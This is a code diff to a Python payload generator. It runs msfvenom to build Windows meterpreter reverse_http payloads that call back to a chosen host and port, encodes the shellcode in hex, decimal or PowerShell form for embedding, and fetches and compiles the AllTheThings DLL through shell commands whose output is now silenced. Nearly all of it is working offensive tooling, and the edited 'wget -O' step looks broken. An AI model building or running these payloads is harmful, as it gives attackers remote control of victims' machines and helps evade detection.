@@ -20,7 +20,7 @@ class Generator():
 			form = "raw"
 		elif shellProcess == 'pshEncode':
 			form = "psh"
-		
+
 		if (arch  == "x86"):
 			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + name +"LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 		else:
@@ -30,7 +30,7 @@ class Generator():
 			code = f.read()
 
 		shellcode = str(code)
-		
+
 		if shellProcess == 'hexEncode':
 			shellcode = self.hexEncode(shellcode)
 		elif shellProcess == 'decEncode':
@@ -90,7 +90,7 @@ class Generator():
 					shellcode = shellcode[:i]+" _\r\n"+shellcode[i+len(lineEnd):]
 					even = even<<1
 		shellcode = shellcode[:-4]
-			
+
 		return(shellcode)
 
 	def pshEncode(self, shellcode):
@@ -108,13 +108,13 @@ class Generator():
 	def compileAllTheThings(name):
 		build_steps = [
 				"apt-get install mono-complete -y",
-				"git clone https://github.com/ConsciousHacker/AllTheThings",
-				"wget https://github.com/mono/nuget-binary/raw/master/nuget.exe",
-				"cp ./GenerateAll/allthethings.cs ./AllTheThings/AllTheThings/Program.cs"
-				"mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln",
-				"mdtool build ./AllTheThings/AllTheThings/AllTheThings.csproj"
-				"cp ./AllTheThings/bin/Debug/AllTheThings.dll ./GenerateAll/AllTheThings.dll"
+				"git clone https://github.com/ConsciousHacker/AllTheThings >/dev/null 2>&1",
+				"wget -O https://github.com/mono/nuget-binary/raw/master/nuget.exe >/dev/null 2>&1",
+				"cp ./GenerateAll/allthethings.cs ./AllTheThings/AllTheThings/Program.cs >/dev/null 2>&1",
+				"mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln >/dev/null 2>&1",
+				"mdtool build ./AllTheThings/AllTheThings/AllTheThings.csproj >/dev/null 2>&1",
+				"cp ./AllTheThings/AllTheThings/bin/Debug/AllTheThings.dll ./GenerateAll/AllTheThings.dll >/dev/null 2>&1"
 				]
 
 		for step in build_steps:
-			os.system(step)
+			os.popen(step)
